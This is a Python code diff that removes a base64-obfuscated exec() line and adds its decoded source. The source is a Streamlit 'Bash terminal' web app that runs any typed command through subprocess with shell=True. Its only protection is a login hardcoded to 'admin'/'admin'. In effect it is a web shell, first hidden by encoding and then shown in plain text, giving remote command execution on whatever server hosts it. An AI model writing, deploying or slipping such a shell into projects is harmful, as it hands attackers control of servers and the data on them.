@@ -1,2 +1,37 @@
-import base64
-exec(base64.b64decode("aW1wb3J0IHN0cmVhbWxpdCBhcyBzdAppbXBvcnQgc3VicHJvY2VzcwoKZGVmIHJ1bl9jb21tYW5kKGNvbW1hbmQpOgogICAgdHJ5OgogICAgICAgIHJlc3VsdCA9IHN1YnByb2Nlc3MucnVuKGNvbW1hbmQsIHNoZWxsPVRydWUsIGNhcHR1cmVfb3V0cHV0PVRydWUsIHRleHQ9VHJ1ZSwgY2hlY2s9VHJ1ZSkKICAgICAgICByZXR1cm4gcmVzdWx0LnN0ZG91dAogICAgZXhjZXB0IHN1YnByb2Nlc3MuQ2FsbGVkUHJvY2Vzc0Vycm9yIGFzIGU6CiAgICAgICAgcmV0dXJuIGYiRXJyb3I6XG57ZS5zdGRlcnJ9IgoKIyDmo4Dmn6XnlKjmiLfmmK/lkKblt7LnmbvlvZUKaWYgJ2xvZ2dlZF9pbicgbm90IGluIHN0LnNlc3Npb25fc3RhdGU6CiAgICBzdC5zZXNzaW9uX3N0YXRlLmxvZ2dlZF9pbiA9IEZhbHNlCgojIOWmguaenOeUqOaIt+acqueZu+W9le+8jOaYvuekuueZu+W9leihqOWNlQppZiBub3Qgc3Quc2Vzc2lvbl9zdGF0ZS5sb2dnZWRfaW46CiAgICBzdC50aXRsZSgi566h55CG5ZGY55m75b2VIikKICAgIGFkbWluX3VzZXJuYW1lID0gc3QudGV4dF9pbnB1dCgi6K+36L6T5YWl566h55CG5ZGY6LSm5Y+3OiIpCiAgICBhZG1pbl9wYXNzd29yZCA9IHN0LnRleHRfaW5wdXQoIuivt+i+k+WFpeWvhueggToiLCB0eXBlPSJwYXNzd29yZCIpCgogICAgaWYgc3QuYnV0dG9uKCLnmbvlvZUiKToKICAgICAgICAjIOi/memHjOiuvue9rum7mOiupOeahOeuoeeQhuWRmOi0puWPt+WSjOWvhueggQogICAgICAgIGlmIGFkbWluX3VzZXJuYW1lID09ICJhZG1pbiIgYW5kIGFkbWluX3Bhc3N3b3JkID09ICJhZG1pbiI6ICAjIOm7mOiupOi0puWPt+WSjOWvhueggQogICAgICAgICAgICBzdC5zZXNzaW9uX3N0YXRlLmxvZ2dlZF9pbiA9IFRydWUKICAgICAgICAgICAgc3Quc3VjY2Vzcygi55m75b2V5oiQ5Yqf77yBIikKICAgICAgICBlbHNlOgogICAgICAgICAgICBzdC5lcnJvcigi55m75b2V5aSx6LSl77yM6K+35qOA5p+l6LSm5Y+35ZKM5a+G56CB44CCIikKZWxzZToKICAgIHN0LnRpdGxlKCJCYXNoIOe7iOerr+aooeaLnyIpCiAgICAKICAgIGNvbW1hbmQgPSBzdC50ZXh0X2lucHV0KCLovpPlhaUgQmFzaCDlkb3ku6Q6IikKICAgIAogICAgaWYgY29tbWFuZC5zdHJpcCgpOgogICAgICAgIG91dHB1dCA9IHJ1bl9jb21tYW5kKGNvbW1hbmQpCiAgICAgICAgc3QudGV4dF9hcmVhKCLlkb3ku6TovpPlh7o6Iiwgb3V0cHV0LCBoZWlnaHQ9MzAwKQogICAgZWxzZToKICAgICAgICBzdC53YXJuaW5nKCLor7fovpPlhaXlkb3ku6TjgIIiKQ==").decode())
+import streamlit as st
+import subprocess
+
+def run_command(command):
+    try:
+        result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True)
+        return result.stdout
+    except subprocess.CalledProcessError as e:
+        return f"Error:\n{e.stderr}"
+
+# 检查用户是否已登录
+if 'logged_in' not in st.session_state:
+    st.session_state.logged_in = False
+
+# 如果用户未登录，显示登录表单
+if not st.session_state.logged_in:
+    st.title("管理员登录")
+    admin_username = st.text_input("请输入管理员账号:")
+    admin_password = st.text_input("请输入密码:", type="password")
+
+    if st.button("登录"):
+        # 这里设置默认的管理员账号和密码
+        if admin_username == "admin" and admin_password == "admin":  # 默认账号和密码
+            st.session_state.logged_in = True
+            st.success("登录成功！")
+        else:
+            st.error("登录失败，请检查账号和密码。")
+else:
+    st.title("Bash 终端模拟")
+    
+    command = st.text_input("输入 Bash 命令:")
+    
+    if command.strip():
+        output = run_command(command)
+        st.text_area("命令输出:", output, height=300)
+    else:
+        st.warning("请输入命令。")
